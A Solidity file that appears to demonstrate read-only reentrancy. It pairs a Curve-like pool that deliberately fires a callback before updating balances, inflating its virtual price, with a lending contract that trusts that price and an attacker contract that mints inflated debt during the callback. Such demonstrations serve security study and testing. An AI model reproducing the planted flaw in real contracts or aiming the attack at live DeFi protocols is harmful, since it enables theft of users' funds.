// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICurveRemoveCallback {
    function onRemoveLiquidity() external;
}

contract VulnerableCurveLikePool {
    uint256 public balance0;
    uint256 public balance1;
    uint256 public totalSupply;
    mapping(address => uint256) public lpBalance;

    function seed(address user, uint256 lp, uint256 b0, uint256 b1) external {
        lpBalance[user] = lp;
        totalSupply = lp;
        balance0 = b0;
        balance1 = b1;
    }

    function get_virtual_price() external view returns (uint256) {
        return (balance0 + balance1) * 1e18 / totalSupply;
    }

    function removeLiquidity(uint256 lpAmount) external {
        lpBalance[msg.sender] -= lpAmount;
        totalSupply -= lpAmount;

        // Reentrancy window: LP supply is lower, pool balances are not lowered yet.
        ICurveRemoveCallback(msg.sender).onRemoveLiquidity();

        balance0 -= lpAmount;
        balance1 -= lpAmount;
    }
}

contract VictimCDPUsingVirtualPrice {
    VulnerableCurveLikePool public immutable pool;
    mapping(address => uint256) public debt;

    constructor(VulnerableCurveLikePool pool_) {
        pool = pool_;
    }

    function mintDebt(uint256 lpCollateral) external {
        uint256 inflatedValue = lpCollateral * pool.get_virtual_price() / 1e18;
        debt[msg.sender] += inflatedValue / 2;
    }
}

contract CurveVirtualPriceRORAttacker is ICurveRemoveCallback {
    VulnerableCurveLikePool public pool;
    VictimCDPUsingVirtualPrice public cdp;

    function attack(VulnerableCurveLikePool pool_, VictimCDPUsingVirtualPrice cdp_) external {
        pool = pool_;
        cdp = cdp_;
        pool.removeLiquidity(pool.lpBalance(address(this)) / 2);
    }

    function onRemoveLiquidity() external override {
        cdp.mintDebt(pool.lpBalance(address(this)));
    }
}
